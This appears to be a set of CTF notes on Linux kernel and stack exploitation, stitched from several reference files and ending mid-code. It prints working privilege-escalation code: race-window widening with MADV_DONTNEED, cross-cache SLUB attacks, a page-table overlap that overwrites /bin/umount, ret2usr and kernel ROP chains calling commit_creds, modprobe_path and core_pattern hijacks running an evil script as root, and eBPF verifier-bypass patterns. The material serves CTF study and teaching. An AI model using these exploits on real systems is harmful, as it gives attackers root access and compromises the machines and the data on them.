**Split object over two pages:** Place a kernel object so it spans a page boundary. The first page is normal; the second triggers uffd. The kernel processes the first half, then blocks on the second half -- the race window occurs mid-operation.

### Alternative Race Techniques (uffd Disabled)

When `CONFIG_USERFAULTFD` is disabled or uffd is restricted to root:

1. **Large `copy_from_user()` buffer:** Pass an enormous buffer to slow down the copy operation, widening the race window
2. **CPU pinning + heavy syscalls:** Pin racing threads to the same core; use heavy kernel functions to extend the timing window
3. **Repeated attempts:** Pure race without stabilization -- run exploit in a loop. Success rate varies (1% to 50% depending on timing)
4. **TSC-based timing (Context Conservation):** Loop checking TSC (Time Stamp Counter) before entering the critical section to confirm execution is at the beginning of its CFS timeslice -- reduces scheduler preemption during the race

---

## SLUB Allocator Internals

### Freelist Pointer Hardening

Since kernel 5.7+, free pointers in SLUB objects are placed in the **middle** of the object (word-aligned), not at offset 0:

```c
// From mm/slub.c
if (freepointer_area > sizeof(void *)) {
    s->offset = ALIGN(freepointer_area / 2, sizeof(void *));
}
```

**Impact:** Simple buffer overflows from the start of a freed chunk cannot reach the free pointer. Underflows from adjacent chunks may still work.

### Freelist Obfuscation (CONFIG_SLAB_FREELIST_HARDEN)

When enabled, free pointers are XOR-obfuscated with a per-cache random value:

```text
stored_ptr = real_ptr ^ kmem_cache->random
```

**Detection:** In GDB, find `kmem_cache_cpu` (via `$GS_BASE + kmem_cache.cpu_slab` offset), follow the `freelist` pointer, and check if the stored values look like valid kernel addresses. If not, obfuscation is active.

---

## Leak via Kernel Panic

When KASLR is disabled (or layout is known) and the kernel uses `initramfs`:

```nasm
jmp &flag   ; jump to the address of the flag file content in memory
```

The kernel panics and the panic message includes the faulting instruction bytes in the `CODE` section -- these bytes are the flag content.

**Prerequisites:** No KASLR (or full layout knowledge), `initramfs` (flag is loaded into kernel memory), RIP control.

---

## Race Window Extension via MADV_DONTNEED + mprotect (DiceCTF 2026)

**Pattern (cornelslop):** Kernel module has a TOCTOU race between check and delete paths, but the window is too narrow to hit reliably. Extend the race window from milliseconds to dozens of seconds by forcing repeated page faults during the long-running kernel operation.

**Technique:**
1. Map memory used by the kernel check operation (e.g., `sha256_va_range()` reading userland pages)
2. From a second thread, loop `MADV_DONTNEED` (drops page table entries) + `mprotect()` (toggles permissions)
3. Each fault during the kernel's hash computation forces VMA lock acquisition and page fault handling
4. The kernel operation stalls repeatedly, keeping the race window open

```c
// Thread 1: trigger the vulnerable CHECK ioctl (long-running hash)
ioctl(fd, CHECK_ENTRY, &entry);

// Thread 2: extend race window by forcing repeated faults
while (racing) {
    madvise(buf, PAGE_SIZE, MADV_DONTNEED);  // drop PTE
    mprotect(buf, PAGE_SIZE, PROT_READ);      // force fault on next access
    mprotect(buf, PAGE_SIZE, PROT_READ | PROT_WRITE);  // restore
}

// Thread 3: trigger the concurrent DEL ioctl
ioctl(fd, DEL_ENTRY, &entry);  // races with CHECK path
```

**Key insight:** `MADV_DONTNEED` drops page table entries without freeing the underlying pages. When the kernel next accesses that userland memory (e.g., during a hash computation), it faults and must re-establish the mapping. Combined with `mprotect()` toggling, this creates lock contention that extends any kernel operation touching userland pages from sub-millisecond to tens of seconds — turning impractical race conditions into reliable exploits.

---

## Cross-Cache Attack via CPU-Split Strategy (DiceCTF 2026)

**Pattern (cornelslop):** Vulnerable object is in a dedicated SLUB cache (not `kmalloc-*`), preventing standard same-cache reclaim after a double-free. Force pages out of the dedicated cache into the buddy allocator by splitting allocation and deallocation across CPUs.

**Technique:**
1. **Allocate N objects on CPU 0** — fills slab pages on CPU 0's partial list
2. **Free the same objects from CPU 1** — freed objects go to CPU 1's partial list (not CPU 0's)
3. CPU 1's partial list overflows to the **node partial list**
4. Completely empty slabs are released to the **PCP (per-CPU page) list**, then to the **buddy allocator**
5. Reallocate those pages as a different object type (e.g., page tables)

```c
// Pin allocation thread to CPU 0
cpu_set_t set;
CPU_ZERO(&set);
CPU_SET(0, &set);
sched_setaffinity(0, sizeof(set), &set);

// Allocate MAX_ENTRIES objects (fills ~3 slab pages)
for (int i = 0; i < MAX_ENTRIES; i++)
    ioctl(fd, ALLOC_ENTRY, &entries[i]);

// Pin free thread to CPU 1
CPU_SET(1, &set);
sched_setaffinity(0, sizeof(set), &set);

// Free from different CPU — objects land on CPU 1's partial list
for (int i = 0; i < MAX_ENTRIES; i++)
    ioctl(fd, FREE_ENTRY, &entries[i]);
// Empty slabs flow: CPU1 partial → node partial → PCP → buddy allocator
```

**Key insight:** SLUB allocates and frees per-CPU. When an object is freed on a different CPU than where it was allocated, it enters a different partial list. When that list overflows, empty slabs are returned to the buddy allocator — escaping the dedicated cache entirely. This enables cross-cache attacks even against custom `kmem_cache_create()` caches that are immune to standard heap spray.

---

## PTE Overlap Primitive for File Write (DiceCTF 2026)

**Pattern (cornelslop):** After reclaiming a freed page as a PTE (page table entry) page, overlap an anonymous writable mapping and a read-only file mapping so both are backed by the same physical page via corrupted PTEs.

**Technique:**
1. Trigger cross-cache double-free to get a page into the buddy allocator
2. Allocate a new anonymous mapping — kernel uses the freed page as a PTE page
3. Map a read-only file (e.g., `/bin/umount`) into the same PTE region
4. The corrupted PTE page now has entries pointing to the file's physical pages
5. Write through the anonymous (writable) mapping → modifies the file's pages directly
6. Overwrite the file's shebang/header to execute an attacker-controlled script

```c
// After cross-cache frees page into buddy allocator:

// 1. Anonymous mapping reclaims the page as PTE storage
char *anon = mmap(NULL, PAGE_SIZE * 512, PROT_READ | PROT_WRITE,
                  MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
// Touch pages to populate PTEs in the reclaimed page
for (int i = 0; i < 512; i++)
    anon[i * PAGE_SIZE] = 'A';

// 2. File mapping into overlapping virtual range
int file_fd = open("/bin/umount", O_RDONLY);
char *file_map = mmap(target_addr, PAGE_SIZE, PROT_READ,
                      MAP_PRIVATE | MAP_FIXED, file_fd, 0);

// 3. Write through anonymous side corrupts file content
// Overwrite ELF header / shebang with #!/tmp/pwn
memcpy(anon + offset, "#!/tmp/pwn\n", 11);

// 4. Execute the corrupted binary → runs attacker script as root
system("/bin/umount /tmp 2>/dev/null");
```

**Key insight:** PTE pages are just regular physical pages repurposed by the kernel's page table allocator. If a freed slab page is reclaimed as a PTE page, both the original (corrupted) slab entries and the new PTE entries coexist. By carefully overlapping anonymous and file-backed mappings in the same PTE page, writes to the anonymous mapping transparently modify file-backed pages — achieving arbitrary file write without any direct kernel write primitive. This bypasses all standard file permission checks since the write happens at the physical page level.


# kernel

# CTF Pwn - Linux Kernel Exploitation

## Table of Contents
- [Environment Setup and Recon](#environment-setup-and-recon)
  - [QEMU Debug Environment](#qemu-debug-environment)
  - [Extracting vmlinux](#extracting-vmlinux)
  - [Kernel Config Checks](#kernel-config-checks)
  - [FGKASLR Detection](#fgkaslr-detection)
- [Useful Kernel Structures for Heap Spray](#useful-kernel-structures-for-heap-spray)
  - [tty_struct (kmalloc-1024)](#tty_struct-kmalloc-1024)
  - [tty_file_private (kmalloc-32)](#tty_file_private-kmalloc-32)
  - [poll_list (kmalloc-32 to 1024)](#poll_list-kmalloc-32-to-1024)
  - [user_key_payload (kmalloc-32 to 1024)](#user_key_payload-kmalloc-32-to-1024)
  - [setxattr Temporary Buffer (kmalloc-32 to 1024)](#setxattr-temporary-buffer-kmalloc-32-to-1024)
  - [seq_operations (kmalloc-32)](#seq_operations-kmalloc-32)
  - [subprocess_info (kmalloc-128)](#subprocess_info-kmalloc-128)
- [Kernel Stack Overflow and Canary Leak](#kernel-stack-overflow-and-canary-leak)
- [Privilege Escalation Primitives](#privilege-escalation-primitives)
  - [ret2usr (No SMEP/SMAP)](#ret2usr-no-smepsmap)
  - [Kernel ROP with prepare_kernel_cred / commit_creds](#kernel-rop-with-prepare_kernel_cred--commit_creds)
  - [Saving and Restoring Userland State](#saving-and-restoring-userland-state)
- [modprobe_path Overwrite](#modprobe_path-overwrite)
  - [Technique Overview](#technique-overview)
  - [Bruteforce Without Leak](#bruteforce-without-leak)
  - [Checking CONFIG_STATIC_USERMODEHELPER](#checking-config_static_usermodehelper)
- [core_pattern Overwrite](#core_pattern-overwrite)
- [Kernel Heap Overflow via kmalloc Size Mismatch (PlaidCTF 2013)](#kernel-heap-overflow-via-kmalloc-size-mismatch-plaidctf-2013)
- [eBPF Verifier Bypass Exploitation (UIUCTF 2021, D^3CTF 2022)](#ebpf-verifier-bypass-exploitation-uiuctf-2021-d3ctf-2022)
For tty_struct kROP (kernel Return-Oriented Programming), userfaultfd race stabilization, SLUB internals, cross-cache attacks, and DiceCTF 2026 kernel patterns, see [kernel-techniques.md](kernel-techniques.md).

For protection bypass techniques (KASLR, FGKASLR, KPTI, SMEP, SMAP), GDB debugging, initramfs workflow, and exploit templates, see [kernel-bypass.md](kernel-bypass.md).

---

## Environment Setup and Recon

**Key insight:** Before writing any exploit, check the QEMU launch script for enabled mitigations (`smep`, `smap`, `kpti`, `kaslr`) and the `oops=panic` flag. These determine which exploitation techniques are viable. Disable all mitigations for initial debugging, then re-enable them one by one.

### QEMU Debug Environment

Standard QEMU launch script for kernel challenge debugging:

```bash
qemu-system-x86_64 \
  -kernel ./bzImage \
  -initrd ./rootfs.cpio \
  -nographic \
  -monitor none \
  -cpu qemu64 \
  -append "console=ttyS0 nokaslr panic=1" \
  -no-reboot \
  -s \
  -m 256M
```

- `-s` enables GDB on port 1234 (`target remote :1234`)
- `-append "nokaslr"` disables KASLR for debugging
- Check QEMU script for: `smep`, `smap`, `kaslr`, `oops=panic`, `kpti=1`
- If `oops=panic` is absent, kernel oops only kills the faulting process (exploitable for info leaks via dmesg)

**Disable mitigations for initial debugging** by modifying the launch script:
```bash
-append "console=ttyS0 nokaslr nopti nosmep nosmap quiet panic=1"
-cpu kvm64   # instead of kvm64,+smep,+smap
```

### Extracting vmlinux

**Extract vmlinux from bzImage:**
```bash
# Use extract-vmlinux.sh from Linux kernel source (scripts/extract-vmlinux)
./extract-vmlinux ./bzImage > vmlinux

# Extract ROP gadgets
ROPgadget --binary ./vmlinux > gadgets.txt
```

### Kernel Config Checks

| Config | Effect | How to Check |
|--------|--------|-------------|
| SMEP/SMAP/KASLR/KPTI | CPU-level mitigations | Check QEMU run script `-cpu` and `-append` flags |
| FGKASLR | Per-function randomization | `readelf -S vmlinux` section count (see below) |
| `SLAB_FREELIST_RANDOM` | Randomized freelist order | Sequential allocations not adjacent |
| `SLAB_FREELIST_HARDEN` | XOR-obfuscated free pointers | Check freelist pointers in GDB |
| `STATIC_USERMODEHELPER` | Blocks `modprobe_path` overwrite | Disassemble `call_usermodehelper_setup` |
| `KALLSYMS_ALL` | `.data` symbols in `/proc/kallsyms` | `grep modprobe_path /proc/kallsyms` |
| `CONFIG_USERFAULTFD` | Enables userfaultfd syscall | Try calling it; disabled = -ENOSYS |
| eBPF (extended Berkeley Packet Filter) JIT | JIT-compiled BPF filters | `cat /proc/sys/net/core/bpf_jit_enable` (0=off, 1=on, 2=debug) |

Check oops behavior:
- `oops=panic` in QEMU `-append` -> oops causes full kernel panic
- Without it -> oops kills the faulting process only; dmesg may leak stack/heap/kbase pointers

### FGKASLR Detection

Fine-Grained KASLR randomizes each function independently. Detect by counting ELF sections:

```bash
readelf -S vmlinux | tail -5
# FGKASLR disabled: ~30 sections
# FGKASLR enabled:  36000+ sections (one per function)

file vmlinux
# FGKASLR enabled: "too many section (36140)"
```

---

## Useful Kernel Structures for Heap Spray

These structures are allocated from standard `kmalloc` caches and controlled from userspace. Use them to fill freed slots for UAF exploitation or to leak kernel pointers.

**Key insight:** Match the vulnerable object's `kmalloc` cache size to choose the right spray structure. For kmalloc-32, use `seq_operations` or `tty_file_private`; for kmalloc-1024, use `tty_struct`; for variable sizes (32-1024), use `poll_list`, `user_key_payload`, or `setxattr`.

| Structure | Cache | Alloc Trigger | Free Trigger | Use |
|-----------|-------|---------------|--------------|-----|
| `tty_struct` | kmalloc-1024 | `open("/dev/ptmx")` | `close(fd)` | kbase leak, RIP hijack |
| `tty_file_private` | kmalloc-32 | `open("/dev/ptmx")` | `close(fd)` | kheap leak (points to `tty_struct`) |
| `poll_list` | kmalloc-32~1024 | `poll(fds, nfds, timeout)` | `poll()` returns | kheap leak, arbitrary free |
| `user_key_payload` | kmalloc-32~1024 | `add_key()` | `keyctl_revoke()`+GC | arbitrary value write |
| `setxattr` buffer | kmalloc-32~1024 | `setxattr()` | same call path | momentary arbitrary value write |
| `seq_operations` | kmalloc-32 | `open("/proc/self/stat")` | `close(fd)` | kbase leak, RIP hijack |
| `subprocess_info` | kmalloc-128 | internal kernel | internal kernel | kbase leak, RIP hijack |

### tty_struct (kmalloc-1024)

Allocated when `open("/dev/ptmx")`, freed on `close()`. Size: 0x2B8 bytes.

```c
struct tty_struct {
    int magic;                    // +0x00: must be 0x5401 (paranoia check)
    struct kref kref;             // +0x04: reference count
    struct device *dev;           // +0x08
    struct tty_driver *driver;    // +0x10: must be valid kheap pointer
    const struct tty_operations *ops; // +0x18: vtable pointer -> kbase leak
    // ...
};
```

- **kbase leak:** Read `tty_struct.ops` -- points to `ptm_unix98_ops` (or similar) in kernel `.data`
- **RIP hijack:** Overwrite `tty_struct.ops` with pointer to fake vtable, then `ioctl()` calls `tty->ops->ioctl()`
- **magic** must remain `0x5401` or `tty_ioctl()` returns immediately (paranoia check)
- **driver** must be a valid kernel heap pointer or the kernel will oops

### tty_file_private (kmalloc-32)

Allocated alongside `tty_struct` in `tty_alloc_file()`. Size: 0x20 bytes.

```c
struct tty_file_private {
    struct tty_struct *tty;   // +0x00: pointer to tty_struct in kmalloc-1024
    struct file *file;        // +0x08
    struct list_head list;    // +0x10
};
```

- **kheap leak:** Read `tty_file_private.tty` to get address in `kmalloc-1024`

### poll_list (kmalloc-32 to 1024)

Allocated during `poll()`, freed when `poll()` completes (timer expiry or event trigger). Cache size depends on number of fds polled.

```c
struct poll_list {
    struct poll_list *next;   // +0x00: linked list pointer
    int len;                  // +0x08: number of entries
    struct pollfd entries[];  // +0x0C: variable-length array
};
```

- **Arbitrary free:** Overwrite `poll_list.next` -> when `poll()` finishes, it frees all entries in the linked list including the corrupted pointer -> UAF on arbitrary address

### user_key_payload (kmalloc-32 to 1024)

Allocated via `add_key()` syscall. Cache size depends on `data` length.

```c
struct user_key_payload {
    struct callback_head rcu;     // +0x00: 16 bytes, untouched until init
    unsigned short datalen;       // +0x10
    char data[];                  // +0x18: user-controlled content
};
```

- First 16 bytes are uninitialized until GC callback -- combine with UAF to leak residual heap data
- Free requires `keyctl_revoke()` then wait for GC
- Blocked by default Docker seccomp profile

### setxattr Temporary Buffer (kmalloc-32 to 1024)

`setxattr("file", "user.x", data, size, XATTR_CREATE)` allocates a buffer, copies user data, then frees it in the same call path.

- **Momentary write:** Combine with uninitialized structs to write arbitrary values into freed chunks
- Cannot be used for persistent spray (freed immediately)
- The file passed to `setxattr()` must exist -- common pitfall when exploit runs from different directory than expected

### seq_operations (kmalloc-32)

Allocated when opening `/proc/self/stat` (or similar seq_file). Contains function pointers for kbase leak.

### subprocess_info (kmalloc-128)

Internal kernel struct with function pointers. Useful for kbase leak and RIP hijack in specific scenarios.

---

## Kernel Stack Overflow and Canary Leak

Kernel modules with vulnerable read/write handlers often allow stack buffer overflow. The exploitation pattern mirrors userland stack overflows but with kernel-specific register state management.

**Canary leak via oversized read (hxp CTF 2020):**

A vulnerable `hackme_read()` copies from a 32-element stack array `tmp[32]` but allows reading up to 0x1000 bytes -- leaking the stack canary and kernel text pointers beyond the buffer.

```c
unsigned long leak[40];
int fd = open("/dev/hackme", O_RDWR);

// Read beyond stack buffer to leak canary + kernel pointers
read(fd, leak, sizeof(leak));

// Stack layout: tmp[32] at rbp-0x98, canary at rbp-0x18
// Canary at index 16 (offset 0x80 from buffer start)
unsigned long cookie = leak[16];

// Kernel text pointer at index 38 -> compute KASLR base
unsigned long kernel_base = (leak[38] & 0xffffffffffff0000);
long kaslr_offset = kernel_base - 0xffffffff81000000;
```

**Stack overflow payload structure:**

```c
unsigned long payload[50];
int off = 16;                    // offset to canary position
payload[off++] = cookie;         // canary
payload[off++] = 0x0;            // padding (rbx)
payload[off++] = 0x0;            // padding (r12)
payload[off++] = 0x0;            // saved rbp
payload[off++] = rop_start;      // return address -> ROP chain
// ... ROP chain follows ...
write(fd, payload, sizeof(payload));
```

**ioctl-based size check bypass (K3RN3LCTF 2021):**

Some modules gate write length against a global `MaxBuffer` variable that is itself controllable via `ioctl()`:

```c
// Vulnerable pattern in module:
// swrite() checks: if (MaxBuffer < user_size) return -EFAULT;
// sioctl() with cmd 0x20: MaxBuffer = (int)arg;  <- attacker-controlled

// Exploit: increase MaxBuffer before overflow
int fd = open("/proc/pwn_device", O_RDWR);
ioctl(fd, 0x20, 300);            // set MaxBuffer to 300 (buffer is only 128)
write(fd, overflow_payload, 300); // now passes size check -> stack overflow
```

**Key insight:** Kernel stack canaries work identically to userland canaries. A vulnerable read handler that copies more bytes than the buffer size leaks the canary and saved registers, including kernel text pointers for KASLR bypass. Look for `ioctl` handlers that modify global variables used in bounds checks -- they often bypass write size restrictions.

---

## Privilege Escalation Primitives

### ret2usr (No SMEP/SMAP)

When SMEP and SMAP are disabled, the kernel can directly execute userland code and access userland memory. Hijack RIP to a userland function that calls `prepare_kernel_cred(0)` and `commit_creds()`.

```c
// Addresses from /proc/kallsyms (or leak)
unsigned long prepare_kernel_cred = 0xffffffff814c67f0;
unsigned long commit_creds       = 0xffffffff814c6410;

// Saved userland state for iretq return
unsigned long user_cs, user_ss, user_sp, user_rflags, user_rip;

void privesc() {
    __asm__(".intel_syntax noprefix;"
        "movabs rax, %[prepare_kernel_cred];"
        "xor rdi, rdi;"        // prepare_kernel_cred(NULL) -> init cred
        "call rax;"
        "mov rdi, rax;"        // commit_creds(new_cred)
        "movabs rax, %[commit_creds];"
        "call rax;"
        "swapgs;"              // restore GS base for userland
        "mov r15, %[user_ss];   push r15;"
        "mov r15, %[user_sp];   push r15;"
        "mov r15, %[user_rflags]; push r15;"
        "mov r15, %[user_cs];   push r15;"
        "mov r15, %[user_rip];  push r15;"
        "iretq;"               // return to userland as root
        ".att_syntax;"
        : : [prepare_kernel_cred] "r"(prepare_kernel_cred),
            [commit_creds] "r"(commit_creds),
            [user_ss] "r"(user_ss), [user_sp] "r"(user_sp),
            [user_rflags] "r"(user_rflags),
            [user_cs] "r"(user_cs), [user_rip] "r"(user_rip));
}
```

After `privesc()` returns to userland, the process has root credentials. Call `system("/bin/sh")` to get a root shell.

### Kernel ROP with prepare_kernel_cred / commit_creds

When SMEP is enabled, build a kernel ROP chain to call `prepare_kernel_cred(0)` -> pass result to `commit_creds()` -> return to userland.

```c
// Find gadgets: ropr --no-uniq -R "^pop rdi; ret;|^mov rdi, rax" ./vmlinux
unsigned long pop_rdi_ret = 0xffffffff81006370;
unsigned long mov_rdi_rax_pop1_ret = 0xffffffff816bf740; // mov rdi, rax; ...; pop rbx; ret
unsigned long swapgs_pop1_ret = 0xffffffff8100a55f;      // swapgs; pop rbp; ret
unsigned long iretq = 0xffffffff8100c0d9;

unsigned long payload[50];
int off = 16;   // canary offset
payload[off++] = cookie;
payload[off++] = 0;           // rbx
payload[off++] = 0;           // r12
payload[off++] = 0;           // rbp

// ROP chain: prepare_kernel_cred(0) -> commit_creds(result)
payload[off++] = pop_rdi_ret;
payload[off++] = 0x0;                      // rdi = NULL
payload[off++] = prepare_kernel_cred;
payload[off++] = mov_rdi_rax_pop1_ret;     // rdi = rax (new cred)
payload[off++] = 0x0;                      // pop rbx padding
payload[off++] = commit_creds;

// Return to userland
payload[off++] = swapgs_pop1_ret;
payload[off++] = 0x0;                      // pop rbp padding
payload[off++] = iretq;
payload[off++] = user_rip;                 // spawn_shell
payload[off++] = user_cs;                  // 0x33
payload[off++] = user_rflags;
payload[off++] = user_sp;
payload[off++] = user_ss;                  // 0x2b
```

**Critical gadget: `mov rdi, rax`** -- needed to pass the return value of `prepare_kernel_cred()` (in RAX) to `commit_creds()` (expects argument in RDI). Search for variants like `mov rdi, rax; ... ; ret` that may clobber other registers.

**Tool:** `ropr` is faster than ROPgadget for large kernel images:
```bash
ropr --no-uniq -R "^pop rdi; ret;|^mov rdi, rax|^swapgs|^iretq" ./vmlinux
```

### Saving and Restoring Userland State

Before triggering the kernel exploit, save userland register state for the `iretq` return:

```c
unsigned long user_cs, user_ss, user_sp, user_rflags, user_rip;

void save_userland_state() {
    __asm__(".intel_syntax noprefix;"
        "mov %[cs], cs;"
        "mov %[ss], ss;"
        "mov %[sp], rsp;"
        "pushf; pop %[rflags];"
        ".att_syntax;"
        : [cs] "=r"(user_cs), [ss] "=r"(user_ss),
          [sp] "=r"(user_sp), [rflags] "=r"(user_rflags));
    user_rip = (unsigned long)spawn_shell;  // function to call after return
}

void spawn_shell() {
    if (getuid() == 0) {
        printf("[+] root!\n");
        system("/bin/sh");
    } else {
        printf("[-] privesc failed\n");
        exit(1);
    }
}
```

**Register values (x86_64 userland):**
- `CS` = 0x33 (64-bit user code segment)
- `SS` = 0x2b (64-bit user stack segment)
- `RSP` = current userland stack pointer
- `RFLAGS` = current flags register
- `RIP` = address of post-exploit function (e.g., `spawn_shell`)

---

## modprobe_path Overwrite

### Technique Overview

Overwrite the global `modprobe_path` variable (default: `"/sbin/modprobe"`) with a path to an attacker-controlled script. When the kernel encounters a binary with an unknown format, it executes `modprobe_path` as root.

**Requirements:**
1. Arbitrary Address Write (AAW) to overwrite `modprobe_path`
2. Ability to create two files: a malformed binary and an evil script
3. `CONFIG_STATIC_USERMODEHELPER` is disabled

**Steps:**

```bash
# 1. Write evil script
echo '#!/bin/sh' > /tmp/evil.sh
echo 'cat /flag > /tmp/output' >> /tmp/evil.sh
echo 'chmod 777 /tmp/output' >> /tmp/evil.sh
chmod +x /tmp/evil.sh

# 2. Overwrite modprobe_path with "/tmp/evil.sh" using your AAW primitive

# 3. Create and execute a malformed binary (non-printable first 4 bytes)
echo -ne '\xff\xff\xff\xff' > /tmp/trigger
chmod +x /tmp/trigger
/tmp/trigger

# 4. Read the flag
cat /tmp/output
```

**How it works:** `execve()` -> `search_binary_handler()` -> no format matches -> `request_module("binfmt-XXXX")` -> `call_modprobe()` -> executes `modprobe_path` as root.

**Key insight:** The first 4 bytes of the trigger binary must be non-printable (not ASCII without tab/newline). If they are printable, the kernel skips the `request_module()` call.

### Bruteforce Without Leak

`modprobe_path` has only 1 byte of entropy under KASLR (the randomized page offset). With AAW, brute-force the address:

```python
# modprobe_path base address (from debugging without KASLR)
MODPROBE_BASE = 0xffffffff8265ff00
# Under KASLR, only the 0x65 byte varies
# Try 256 offsets
for byte_guess in range(256):
    addr = (MODPROBE_BASE & ~0xFF0000) | (byte_guess << 16)
    write_string(addr, "/tmp/evil.sh")
    trigger_modprobe()
```

### Checking CONFIG_STATIC_USERMODEHELPER

If enabled, `call_usermodehelper_setup()` ignores `modprobe_path` and uses a hardcoded constant.

**Detection via disassembly:**

```bash
# 1. Get function address
cat /proc/kallsyms | grep call_usermodehelper_setup

# 2. Set GDB breakpoint and trigger
echo -ne '\xff\xff\xff\xff' > /tmp/nirugiri && chmod +x /tmp/nirugiri && /tmp/nirugiri

# 3. In GDB, disassemble and check:
# NOT set: rdi saved into r14 at +9, used at +127 -> modprobe_path passed through
# SET: immediate constant at +122 instead of r14 -> 1st arg (modprobe_path) ignored
```

**When set:** `sub_info->path = CONFIG_STATIC_USERMODEHELPER_PATH` (constant). Overwriting `modprobe_path` has no effect. Look for alternative LPE techniques.

---

## core_pattern Overwrite

Alternative to `modprobe_path`. Overwrite `/proc/sys/kernel/core_pattern` (or the internal `core_pattern` variable) with a pipe command. When a process crashes, the kernel executes the specified command as root to handle the core dump.

```bash
# core_pattern with pipe: first char '|' means execute as command
# Overwrite core_pattern to: "|/tmp/evil.sh"
# Then crash a process to trigger
```

**Finding the offset:** `core_pattern` is not exported via `/proc/kallsyms` without `CONFIG_KALLSYMS_ALL`. To find it:

1. Set breakpoint on `override_creds()` (called by `do_coredump()`)
2. Crash a process: `int main() { ((void(*)())0)(); }`
3. After `override_creds` returns, disassemble -- look for `movzx` loading from a data address
4. That address is `core_pattern`

**Key insight:** `core_pattern` is an alternative to `modprobe_path` when `CONFIG_STATIC_USERMODEHELPER` blocks modprobe. Overwrite it with `|/tmp/evil.sh` and crash any process to trigger root command execution. Finding the address requires a GDB breakpoint on `override_creds` during a deliberate crash since `core_pattern` is not always exported in `/proc/kallsyms`.

```text
(gdb) finish
(gdb) x/5i $rip
=> 0xffffffff811b1e98:  movzx r13d, BYTE PTR [rip+0xcfec80]  # 0xffffffff81eb0b20
(gdb) x/s 0xffffffff81eb0b20
0xffffffff81eb0b20: "core"
```

---

## Kernel Heap Overflow via kmalloc Size Mismatch (PlaidCTF 2013)

**Pattern:** Kernel module allocates `kmalloc(content_length)` but copies `0x40 + content_length` bytes (header + body), causing a 0x40-byte heap overflow into adjacent slab objects.

```c
// Vulnerable pattern in kernel HTTP handler:
buf = kmalloc(content_length, GFP_KERNEL);
memcpy(buf, http_header, 0x40);           // 0x40 bytes of header
memcpy(buf + 0x40, body, content_length); // Overflow!
```

**Exploitation:**
1. **Slab spray:** Open 1021 file descriptors (`open("/dev/kmalloc_target")`) to fill the kmalloc-256 slab cache
2. **Create holes:** Close 3 files to create gaps in the slab for the overflowing allocation
3. **Trigger overflow:** Send HTTP request with body that overflows into adjacent `struct file`
4. **Corrupt `f_op`:** Overwrite the `f_op` (file operations) pointer in the adjacent `struct file` to redirect function pointers
5. **Hijack write handler:** `f_op->write` now points to attacker-controlled address → `commit_creds(prepare_kernel_cred(0))`

**Key insight:** `struct file` is in kmalloc-256 and contains `f_op` (function pointer table). Corrupting `f_op` to a fake vtable gives control over any file operation (`read`, `write`, `ioctl`). The attacker triggers the hijacked operation via the corrupted file descriptor.

---

## eBPF Verifier Bypass Exploitation (UIUCTF 2021, D^3CTF 2022)

Exploit mismatches between the eBPF verifier's static analysis and runtime behavior to achieve arbitrary kernel read/write.

```c
// Pattern: Verifier tracks register states differently from hardware
// Example: Right-shift desynchronization (D^3CTF 2022)
// Verifier thinks: shr reg, 64 -> reg = 0
// Hardware does:   shr reg, 64 -> reg = original_value (shift >= width = undefined)

// Step 1: Create desynchronized register
BPF_ALU64_IMM(BPF_RSH, BPF_REG_7, 64),  // verifier: R7=0, runtime: R7=1

// Step 2: Use desync to bypass ALU sanitizer
BPF_ALU64_IMM(BPF_MUL, BPF_REG_7, offset),  // verifier: 0*offset=0, runtime: 1*offset=offset

// Step 3: Add to map pointer for OOB access
BPF_ALU64_REG(BPF_ADD, BPF_REG_0, BPF_REG_7),  // verifier allows (adding 0)
// Runtime: map_ptr + offset -> arbitrary kernel memory access

// Step 4: Read/write kernel memory, overwrite modprobe_path or cred struct
```

```bash
# eBPF exploitation workflow:
# 1. Find verifier vs runtime mismatch (RSH, bounds tracking, helper params)
# 2. Create register with verifier_value != runtime_value
# 3. Use desync register to bypass pointer arithmetic checks
# 4. Achieve arbitrary read via map value OOB
# 5. Leak kernel base from adjacent slab objects
# 6. Arbitrary write to modprobe_path or current->cred

# Helper function overflow variant (d3bpf-v2):
# bpf_skb_load_bytes(skb, offset, stack_buf, len)
# Verifier checks len <= 512, but desync makes runtime len huge
# Stack buffer overflow -> ROP to commit_creds(init_cred)

# KASLR bypass via eBPF:
# Trigger controlled oops -> dmesg leaks kernel addresses
# Or: read adjacent slab objects containing kernel pointers
```

**Key insight:** eBPF verifier bugs create a "type confusion" between static analysis and runtime. The pattern is always: (1) find operation where verifier prediction differs from hardware, (2) multiply the difference to create useful offsets, (3) add to map pointer for kernel memory access. Check kernel changelogs for eBPF verifier patches -- each patch implies a prior exploitable bug.

See also: [kernel-techniques.md](kernel-techniques.md) for additional kernel exploitation techniques.


# overflow-basics

# CTF Pwn - Overflow Basics

## Table of Contents
- [Stack Buffer Overflow](#stack-buffer-overflow)
  - [ret2win with Parameter (Magic Value Check)](#ret2win-with-parameter-magic-value-check)
  - [Stack Alignment (16-byte Requirement)](#stack-alignment-16-byte-requirement)
  - [Offset Calculation from Disassembly](#offset-calculation-from-disassembly)
  - [Input Filtering (memmem checks)](#input-filtering-memmem-checks)
  - [Finding Gadgets](#finding-gadgets)
  - [Hidden Gadgets in CMP Immediates](#hidden-gadgets-in-cmp-immediates)
- [Struct Pointer Overwrite (Heap Menu Challenges)](#struct-pointer-overwrite-heap-menu-challenges)
- [Signed Integer Bypass (Negative Quantity)](#signed-integer-bypass-negative-quantity)
- [Canary-Aware Partial Overflow](#canary-aware-partial-overflow)
- [OOB Read via Stride/Rate Leak (DiceCTF 2026)](#oob-read-via-striderate-leak-dicectf-2026)
- [Stack Canary Byte-by-Byte Brute Force on Forking Servers](#stack-canary-byte-by-byte-brute-force-on-forking-servers)
- [Global Buffer Overflow (CSV Injection)](#global-buffer-overflow-csv-injection)
- [Protocol Length Field Stack Bleeding (EKOPARTY CTF 2016)](#protocol-length-field-stack-bleeding-ekoparty-ctf-2016)
- [Parser Stack Overflow via Unchecked memcpy Length (MetaCTF Flash 2026)](#parser-stack-overflow-via-unchecked-memcpy-length-metactf-flash-2026)
- [Stack Canary Null-Byte Overwrite Leak (CSAW 2017)](#stack-canary-null-byte-overwrite-leak-csaw-2017)

---

## Stack Buffer Overflow

1. Find offset to return address: `cyclic 200` then `cyclic -l <value>`
2. Check protections: `checksec --file=binary`
3. No PIE + No canary = direct ROP
4. Canary leak via format string or partial overwrite

### ret2win with Parameter (Magic Value Check)

**Pattern:** Win function checks argument against magic value before printing flag.

```c
// Common pattern in disassembly
void win(long arg) {
    if (arg == 0x1337c0decafebeef) {  // Magic check
        // Open and print flag
    }
}
```

**Exploitation (x86-64):**
```python
from pwn import *

# Find gadgets
